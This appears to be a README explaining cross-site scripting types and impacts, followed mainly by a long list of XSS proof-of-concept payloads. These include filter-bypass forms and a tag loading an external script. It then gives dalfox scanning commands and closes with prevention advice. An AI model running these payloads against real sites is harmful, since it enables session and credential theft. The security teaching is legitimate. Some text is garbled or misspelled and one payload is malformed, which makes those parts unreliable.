# XSS-Explained
Crite Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. 
XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different user like as alert(1) this is the most popular.

## types of XSS attacks 
1.Refleected XSS 
  Description: off a web server often via a query string) and executed in a browser. 
  It happens in(search , URLs)
  
2.Stord XSS 

 Description: Script is stored on the server 
 It happens in ( message , user profiles , comments , chat bot or anywhere to sotred )
 
3.Dom XSS 

 Client-side vulnerability 
 
4.slef XSS 
Occurs when a user unknowingly executes a malicious script that they themselves injected into a vulnerable input field (such as browser developer tools or manipulated links).

## impact 

Data theft as cookies or credentials
Session hijacking and account takeovers.
Defacing websites.
Spreading malware via compromised websites

### PoC 

- `<script>alert(1)</script>`
- `<svg>prompt(1)</svg>`
- `<xss onafterscriptexecute=alert(1)><script>1</script>`
- `<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>`
- `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>`
- `<xss onbeforescriptexecute=alert(1)><script>1</script>`
- `<body onbeforeprint=console.log(1)>`
- `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
- `<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
- `<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>`
- `<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>`
- `<svg><animate onend=alert(1) attributeName=x dur=1s>`
- `<audio src/onerror=alert(1)>`
- `<a id=x tabindex=1 onfocus=alert(1)></a>`
- `<xss onfocus=alert(1) autofocus tabindex=1>`
- `<body onhashchange="print()">`
- `<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>`
- `<input onauxclick=alert(1)>`
- `<xss contenteditable onbeforeinput=alert(1)>test</xss>`
- `<input type=file oncancel=alert(1)>`
- `<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>`
- `<form onreset=alert(1)><input type=reset>`
- `<form><input type=search onsearch=alert(1) value="Hit return" autofocus>`
- `<body onselectstart=alert(1)>select some text`
- `<form onsubmit=alert(1)><input type=submit>`
- `<body ontouchend=alert(1)>`
- `">img scr =q onerror=prompt(100)>`
- `<script>onerror=alert;throw 1</script>`
- `<script>{onerror=alert}throw 1</script>`
- `<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>`
- `<script>alert\`1\`</script>`
- `<svg onload=alert(1)>`
- `<iframe src="javascript:alert(1)">`
- `<a href="javascript:alert(1)">XSS</a>`
- `<script src="data:text/javascript,alert(1)"></script>`
- `<a href=# download="filename.html">Test</a>`
- `javascript:confirm(1);`
- `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
- `<IMG SRC="javascript:alert('XSS');">`
- `&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;`
- `&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;`
- `&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;`
- `&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;`
- `&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;`
- `<img DYNSRC="javascript:document.vulnerable=true;">`
- `<img LOWSRC="javascript:document.vulnerable=true;">`
- `<~/XSS STYLE=xss:expression(alert('XSS'))>`

## PoC by automation tool

1.creat file for find all URLs

2.Using dalfox 

```
gau example.com > urls.txt
dalfox file urls.txt --output results.txt
```

## Preventing XSS Attacks

1. Output Encoding: Encode user input before outputting it back to the browser to ensure that scripts cannot be executed.
2. Content Security Policy (CSP): CSP is a browser security feature that helps prevent XSS by restricting which scripts can be executed on a page.
Example of a CSP header:
```Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;```

3. Input Validation: Validate and sanitize user inputs to ensure only safe data is processed.
For example, block certain characters (e.g., <, >, &) or use whitelisting.
4. HTTPOnly Cookies: Set the HttpOnly flag on cookies to prevent them from being accessed by JavaScript.
5. Escape User Input: Ensure that any user-generated content (e.g., HTML, JavaScript) is properly escaped before being inserted into the pag

References :
[**OWASP**](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS))

[**portswigger**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[**JS Fuck**](https://jsfuck.com/)





